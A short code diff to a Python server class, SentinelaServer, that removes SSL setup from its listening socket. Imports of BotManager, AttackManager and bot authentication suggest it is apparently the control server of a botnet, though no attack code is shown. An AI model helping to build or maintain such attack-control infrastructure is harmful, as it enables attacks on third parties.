@@ -12,7 +12,7 @@ from src.config.config import configs
 from src.database.database import login, get_user
 from src.utils.validators import validate_username
 from src.utils.security import sanitize_log, sanitize_command, verify_bot_auth, RateLimiter
-from src.utils.network import safe_recv, setup_ssl_socket, create_server_socket
+from src.utils.network import safe_recv, create_server_socket
 from src.utils.ui import colorize_text_gradient, send as ui_send, format_banner_info, format_title, ANSI_CLEAR, COLORS
 from src.utils.bot_manager import BotManager
 from src.utils.attack_manager import AttackManager
@@ -142,8 +142,6 @@ class SentinelaServer:
             return False
         
         self.sock = create_server_socket()
-        server_config = self.config.get("server", {})
-        self.sock = setup_ssl_socket(self.sock, server_config)
         
         try:
             self.sock.bind((self.host, self.port))
